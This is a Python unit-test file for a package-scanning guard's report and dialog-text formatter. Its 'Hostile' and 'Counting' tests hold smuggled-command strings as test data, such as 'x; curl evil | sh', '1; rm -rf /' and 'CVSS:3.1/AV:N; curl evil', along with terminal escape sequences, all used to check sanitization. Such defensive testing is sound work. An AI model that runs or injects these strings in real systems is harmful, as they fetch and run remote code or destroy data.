"""text_format: the labelled report, the one-line summary and the confirmation-dialog sentence."""
import json
import sys
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "guard"))
import hook_runtime
import review_report as R
import scan_engine as E
from output import render as M
from output import text_format as T

CVSS = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
PATH = ".aasm/reports/2026-10-07T09-37-10_pyyaml-5.3.1_BLOCK.md"
PYYAML = {"package": "pyyaml", "version": "5.3.1", "verdict": "BLOCK",
          "evidence": [{"rule": "osv", "label": "known vulnerability", "location": "GHSA-8q59-q68h-6hv4 (CVE-2020-14343, CRITICAL)"},
                       {"rule": "install_hook", "label": "install hook", "location": "setup.py:171"},
                       {"rule": "keyword", "label": "uses a dangerous API", "location": "lib/yaml/constructor.py:538"}],
          "advice": {"ids": ["GHSA-8q59-q68h-6hv4"], "severity": "CRITICAL", "fix_version": "5.4", "vuln_count": 1,
                     "vuln_groups": [{"ids": ["GHSA-8q59-q68h-6hv4", "CVE-2020-14343", "PYSEC-2021-142"], "severity": "CRITICAL", "cwe": "CWE-20",
                                      "cvss": CVSS, "published": "2021-03-25"}]},
          "coverage": {"analyzed": True, "notes": []}}
REQUESTS = {"package": "requests", "version": "2.31.0", "verdict": "NEEDS_HUMAN_REVIEW",
            "evidence": [{"rule": "osv", "label": "known vulnerability", "location": "GHSA-9wx4-h78v-vm56 (CVE-2024-35195, MODERATE)"}],
            "advice": {"ids": ["GHSA-9wx4-h78v-vm56"], "severity": "MODERATE", "fix_version": "2.33.0", "vuln_count": 3,
                       "vuln_groups": [{"ids": ["GHSA-9wx4-h78v-vm56", "CVE-2024-35195"], "severity": "MODERATE", "cwe": "CWE-670", "cvss": "", "published": "2024-05-20"},
                                       {"ids": ["GHSA-9hjg-9r4m-mvj7", "CVE-2024-47081"], "severity": "MODERATE", "cwe": "CWE-522", "cvss": "", "published": "2025-06-09"},
                                       {"ids": ["GHSA-gc5v-m9x4-r6x2", "CVE-2026-25645"], "severity": "MODERATE", "cwe": "CWE-377", "cvss": "", "published": "2026-03-25"}]},
            "coverage": {"analyzed": True, "notes": []}}
FIDGET = {"package": "colored-fidget", "version": "1.0", "verdict": "BLOCK",
          "evidence": [{"rule": "download_then_execute", "label": "download then run", "location": "setup.py:6"},
                       {"rule": "setup_network", "label": "network call at install", "location": "setup.py:6"}],
          "advice": {}, "coverage": {"analyzed": True, "notes": []}}
UNSCANNED = {"package": "git+https://github.com/psf/requests.git", "version": "", "verdict": "NEEDS_HUMAN_REVIEW", "advice": {},
             "evidence": [{"rule": "unscanned_source", "label": "unscannable source", "location": "vcs_or_url"}],
             "source": {"kind": "vcs_or_url", "host": "github.com", "repo": "psf/requests", "pinned": False}}
FAILED = {"package": "foo", "version": "1.0", "verdict": "NEEDS_HUMAN_REVIEW", "advice": {},
          "evidence": [{"rule": "fetch_error", "label": "scan failed", "location": "fetch"}],
          "coverage": {"analyzed": False, "failure": "compression limit exceeded: ratio 1029x (limit 150x)", "notes": []}}
ALL = {"pyyaml": PYYAML, "requests": REQUESTS, "fidget": FIDGET, "unscanned": UNSCANNED, "failed": FAILED}


def wid(s):
    return max(M.display_width(l) for l in s.splitlines())


class Golden(unittest.TestCase):
    def test_pyyaml_report(self):
        self.assertEqual(T.report_text({"packages": [PYYAML]}, 60, PATH), "\n".join([
            "[AegisPilot BLOCK] pyyaml 5.3.1",
            "Reason    1 CRITICAL vulnerability GHSA-8q59-q68h-6hv4",
            "          (CVE-2020-14343, CWE-20)",
            "Impact    remote (network) · no login needed · high",
            "          confidentiality, integrity, availability impact",
            "Evidence  setup.py:171 install hook",
            "          lib/yaml/constructor.py:538 uses a dangerous API",
            "Fix       upgrade to pyyaml>=5.4 (OSV fixed version)",
            "Limits    older dependencies are checked against OSV only;",
            "          native binaries are not scanned",
            "Details",
            "  " + PATH]))

    def test_one_line_and_dialog_sentence(self):
        self.assertEqual(T.summary_line(PYYAML), "[AegisPilot] pyyaml 5.3.1 blocked · CRITICAL · upgrade to >=5.4")
        self.assertEqual(T.popup_line(REQUESTS),
                         "[AegisPilot] requests 2.31.0 — 3 MODERATE vulnerabilities (GHSA-9wx4-h78v-vm56 and others) → 2.33.0 or later recommended. If approved, it installs as is. Details: /aegis")

    def test_requests_report_lists_grouped_vulnerabilities(self):
        out = T.report_text({"packages": [REQUESTS]}, 100, PATH)                          # wide enough that nothing wraps
        self.assertIn("3 MODERATE vulnerabilities (aliases of one vulnerability counted once)", out)
        self.assertIn("GHSA-9hjg-9r4m-mvj7 (CVE-2024-47081)", out)
        self.assertIn("upgrade to requests>=2.33.0 (per OSV, the lowest version that fixes all)", out)


class Rules(unittest.TestCase):
    def test_labels_come_in_the_fixed_order_and_limits_are_always_there(self):
        order = ["Reason", "Impact", "Evidence", "Fix", "Limits", "Details"]
        for name, rec in ALL.items():
            out = T.report_text({"packages": [rec]}, 60, PATH)
            labels = [l.split("  ")[0].strip() for l in out.splitlines()[1:] if l[:1] not in (" ", "") and l.split("  ")[0].strip() in order + ["Source"]]
            idx = [order.index(l) for l in labels if l in order]
            self.assertEqual(idx, sorted(idx), (name, labels))
            self.assertIn("Limits", labels, name)

    def test_every_shape_fits_its_budget_at_every_width(self):
        for name, rec in ALL.items():
            self.assertLessEqual(len(T.popup_line(rec)), 200, name)
            self.assertLessEqual(M.display_width(T.summary_line(rec)), 66, name)
            for w in (40, 52, 60, 67, 80, 100):
                out = T.report_text({"packages": [rec]}, w)                    # no path: the one allowed exception is left out
                self.assertLessEqual(wid(out), max(w, 24), (name, w))

    def test_long_names_still_fit_the_one_line(self):
        rec = {**PYYAML, "package": "a-really-quite-long-package-name-for-a-test", "version": "10.20.300+local.build.77"}
        line = T.summary_line(rec)
        self.assertLessEqual(M.display_width(line), 66)
        self.assertIn("blocked", line)

    def test_the_action_survives_a_tight_one_line(self):
        # "MODERATE vulnerability" does not fit next to the fix: the severity wording shrinks first, the fix stays
        rec = {**REQUESTS, "verdict": "NEEDS_HUMAN_REVIEW"}
        line = T.summary_line(rec)
        self.assertLessEqual(M.display_width(line), 66)
        self.assertIn("upgrade to >=2.33.0", line); self.assertIn("MODERATE", line); self.assertIn("held", line)
        self.assertIn("blocked", T.summary_line({**REQUESTS, "verdict": "BLOCK"}))

    def test_no_n_more_wording(self):
        for name, rec in ALL.items():
            self.assertNotIn("and 1 more", T.popup_line(rec)); self.assertNotIn("OSV vulnerability and", T.popup_line(rec))
        weak = {**PYYAML, "evidence": PYYAML["evidence"]}
        self.assertIn("2 other signal kind(s)", T.popup_line(weak))                     # the OTHER KINDS of signal are named as such

    def test_dialog_always_says_what_approval_does(self):
        for name, rec in ALL.items():
            self.assertIn("If approved", T.popup_line(rec), name)
        self.assertIn("If approved, the change is made", T.popup_protected_path(".claude/settings.json"))
        self.assertIn("If approved, the agent can use this server's tools", T.popup_mcp("evil", "npx -y evil-mcp-server", ".mcp.json"))
        self.assertIn("If approved", T.popup_integrity("hooks/x.py checksum differs from install time"))

    def test_unscanned_source_names_the_repository_and_pinning(self):
        out = T.report_text({"packages": [UNSCANNED]}, 100)
        self.assertIn("Source    github.com / psf/requests (branch or tag, not pinned to a commit)", out)
        pinned = {**UNSCANNED, "source": {**UNSCANNED["source"], "pinned": True}}
        self.assertIn("(pinned to a commit)", T.report_text({"packages": [pinned]}, 100))

    def test_failed_analysis_says_what_was_not_read(self):
        out = T.report_text({"packages": [FAILED]}, 60)
        self.assertIn("not scanned: compression limit exceeded", out); self.assertIn("Limits    this package was not scanned (not read)", out)
        self.assertIn("scan failed (compression limit exceeded", T.popup_line(FAILED))

    def test_cvss_words(self):
        self.assertEqual(T.cvss_words(CVSS), "remote (network) · no login needed · high confidentiality, integrity, availability impact")
        self.assertEqual(T.cvss_words("CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N"), "local · low privileges needed · needs user action · high confidentiality impact")
        self.assertEqual(T.cvss_words("garbage"), "")

    def test_integrity_and_multiple_packages_in_the_report(self):
        out = T.report_text({"packages": [PYYAML, REQUESTS], "integrity_findings": ["hooks/pretooluse_check.py checksum differs from install time (possible tampering)"]}, 60, PATH)
        self.assertIn("and requests", out.splitlines()[0])                      # the other package is named, not counted
        self.assertRegex(out, r"Also\s+requests 2\.31\.0")                      # and gets its own one-line summary
        self.assertIn("Warning   1 guard file(s) differ from the record:\n          hooks/pretooluse_check.py", out)


class Hostile(unittest.TestCase):
    def test_package_text_is_cleaned_everywhere(self):
        bad = {**PYYAML, "package": "p\x1b[2J", "version": "1\x07",
               "evidence": [{"rule": "install_hook", "label": "l\x1b]0;x\x07", "location": "a.py:1\x1b[31m\u202e"}], "advice": {}}
        for text in (T.report_text({"packages": [bad]}, 60, PATH), T.popup_line(bad), T.summary_line(bad)):
            self.assertEqual([c for c in text if (ord(c) < 32 and c != "\n") or 0x7f <= ord(c) <= 0x9f or c == "\u202e"], [])

    def test_hostile_name_and_version_are_replaced_in_the_one_line(self):
        line = T.summary_line({**PYYAML, "package": "x; curl evil | sh", "version": "1; rm -rf /"})
        self.assertNotIn("curl", line); self.assertNotIn("rm -rf", line)


class Counting(unittest.TestCase):
    def vuln(self, id_, aliases=(), sev="MODERATE", cwe="CWE-20", published="2024-01-01"):
        return {"id": id_, "aliases": list(aliases), "published": published, "database_specific": {"severity": sev, "cwe_ids": [cwe]},
                "severity": [{"type": "CVSS_V3", "score": CVSS}]}

    def test_aliases_are_one_vulnerability(self):
        vs = [self.vuln("GHSA-a", ["CVE-1", "PYSEC-1"]), self.vuln("PYSEC-1", ["CVE-1", "GHSA-a"]), self.vuln("GHSA-b", ["PYSEC-2"]), self.vuln("PYSEC-2", ["GHSA-b"])]
        self.assertEqual(R._count_groups(vs), 2)
        groups = R._vuln_groups(vs)
        self.assertEqual(len(groups), 2); self.assertEqual(groups[0]["ids"][0][:4], "GHSA")

    def test_chained_aliases_merge_transitively(self):
        vs = [self.vuln("A", ["B"]), self.vuln("B", ["C"]), self.vuln("C", [])]
        self.assertEqual(R._count_groups(vs), 1)

    def test_group_keeps_the_worst_severity_and_validated_fields_only(self):
        vs = [self.vuln("GHSA-a", ["CVE-1"], sev="LOW"), self.vuln("PYSEC-1", ["GHSA-a"], sev="CRITICAL", cwe="CWE-79; rm -rf")]
        g = R._vuln_groups(vs)[0]
        self.assertEqual(g["severity"], "CRITICAL")
        self.assertEqual(g["cwe"], "CWE-20")                                              # the valid one; "CWE-79; rm -rf" is never taken
        self.assertNotIn("rm -rf", json.dumps(g))
        self.assertEqual(R._vuln_groups([self.vuln("X", cwe="CWE-79; rm -rf")])[0]["cwe"], "")
        self.assertEqual(g["cvss"], CVSS)

    def test_bad_cvss_is_dropped(self):
        v = self.vuln("GHSA-a"); v["severity"] = [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N; curl evil"}]
        self.assertEqual(R._vuln_groups([v])[0]["cvss"], "")


class FallsBack(unittest.TestCase):
    def test_a_broken_formatter_never_takes_the_dialog_text_away(self):
        with mock.patch.object(T, "popup_line", side_effect=RuntimeError("boom")):
            self.assertEqual(hook_runtime.text_or("popup_line", "OLD WORDING", PYYAML, 0), "OLD WORDING")
        with mock.patch.object(T, "popup_line", return_value="   "):                        # an empty text is not a text either
            self.assertEqual(hook_runtime.text_or("popup_line", "OLD WORDING", PYYAML, 0), "OLD WORDING")
        self.assertEqual(hook_runtime.text_or("no_such_function", "OLD WORDING"), "OLD WORDING")
        self.assertIn("If approved", hook_runtime.text_or("popup_line", "OLD WORDING", PYYAML, 0))     # and when it works the new text is used

    def test_terminal_report_falls_back_to_the_full_report(self):
        with mock.patch.object(T, "report_text", side_effect=RuntimeError("boom")):
            out = M.terminal_report({"packages": [PYYAML], "verdict": "BLOCK"}, 60, PATH)
        self.assertIn("[AegisPilot BLOCK]", out); self.assertIn("Package    : pyyaml 5.3.1", out); self.assertIn(PATH, out)

    def test_summary_line_falls_back_to_the_earlier_wording(self):
        with mock.patch.object(T, "summary_line", side_effect=RuntimeError("boom")):
            line = M.auto_summary_line({"package": "pyyaml", "version": "5.3.1", "evidence": [{"rule": "osv", "label": "x"}],
                                        "advice": {"ids": ["GHSA-x"], "severity": "CRITICAL", "fix_version": "5.4"}})
        self.assertIn("pyyaml 5.3.1 blocked", line)


if __name__ == "__main__":
    unittest.main()
